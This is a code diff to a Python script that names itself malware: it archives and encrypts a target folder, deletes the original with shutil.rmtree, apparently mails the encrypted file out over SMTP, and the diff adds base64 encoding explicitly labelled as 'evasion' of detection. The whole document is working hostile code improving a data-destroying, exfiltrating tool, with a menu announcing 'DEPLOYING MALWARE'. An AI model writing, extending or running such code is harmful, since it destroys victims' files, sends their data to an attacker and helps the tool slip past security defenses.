@@ -1,5 +1,6 @@
 import os
 import shutil
+import base64  # <-- Added for evasion
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.primitives import hashes
@@ -8,6 +9,23 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
+
+# ===== BASE64 EVASION =====
+def base64_encode(file_path):
+    """Encode binary file to Base64."""
+    with open(file_path, "rb") as f:
+        data = f.read()
+    encoded = base64.b64encode(data)
+    with open(file_path, "wb") as f:
+        f.write(encoded)
+
+def base64_decode(file_path):
+    """Decode Base64 file to binary."""
+    with open(file_path, "rb") as f:
+        data = f.read()
+    decoded = base64.b64decode(data)
+    with open(file_path, "wb") as f:
+        f.write(decoded)
 
 # ===== COMBINED FILE COLLECTOR =====
 def collect_files(source_dir, output_folder):
@@ -58,6 +76,9 @@ def encrypt_folder(folder_path, password):
         with open('malware_encrypted.log', 'wb') as f:
             f.write(encrypted)
 
+        # Apply Base64 evasion
+        base64_encode('malware_encrypted.log')
+
         # Cleanup
         os.remove('temp_archive.zip')
         shutil.rmtree(folder_path)
@@ -66,7 +87,6 @@ def encrypt_folder(folder_path, password):
     except Exception as e:
         print(f"[!] Encryption failed: {e}")
         return False
-
 
 # ===== DECRYPTION =====
 def decrypt_file(encrypted_path, password):
@@ -84,6 +104,9 @@ def decrypt_file(encrypted_path, password):
                 print(f"- {f}")
             return False
         
+        # Base64 decode first
+        base64_decode(encrypted_path)
+
         # Read encrypted data
         with open(encrypted_path, "rb") as f:
             iv = f.read(16)
@@ -175,7 +198,6 @@ def main():
         choice = input("\n>>> OPERATION SELECTION (1/2/3): ").strip()
 
         if choice == '1':
-            # Encrypt
             print("\n💣" * 15 + " DEPLOYING MALWARE " + "💣" * 15)
             target_folder = input("\n[?] 🗂️ Enter TARGET folder path: ").strip()
             if not os.path.exists(target_folder):
@@ -201,7 +223,6 @@ def main():
                         print("[!] 📡 Connection failed - storing locally")
 
         elif choice == '2':
-            # Decrypt
             print("\n🛡️" * 15 + " ACTIVATING COUNTERMEASURES " + "🛡️" * 15)
             encrypted_file = input("\n[?] 🔍 Path to encrypted payload: ").strip()
             if not os.path.exists(encrypted_file):
